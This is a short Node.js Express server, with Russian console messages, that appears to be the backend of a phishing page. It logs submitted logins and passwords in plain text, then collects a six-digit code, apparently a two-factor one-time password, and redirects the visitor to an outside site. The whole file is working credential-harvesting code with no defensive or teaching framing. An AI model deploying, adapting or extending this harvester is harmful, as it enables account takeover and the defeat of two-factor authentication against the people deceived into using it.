const express = require('express');
const bodyParser = require('body-parser');
const app = express();
const port = 3000;

app.use(bodyParser.urlencoded({ extended: true }));

app.post('/login', (req, res) => {
    const { login, password } = req.body;
    console.log('Логин:', login);
    console.log('Пароль:', password);
    res.redirect('/auth.html');
});

app.post('/auth', (req, res) => {
    const { digit1, digit2, digit3, digit4, digit5, digit6 } = req.body;
    console.log('Код:', digit1, digit2, digit3, digit4, digit5, digit6);
    res.redirect('https://example.com/');
});

app.use(express.static('public'));

app.listen(port, () => {
    console.log(`Сервер запущен на порту ${port}`);
});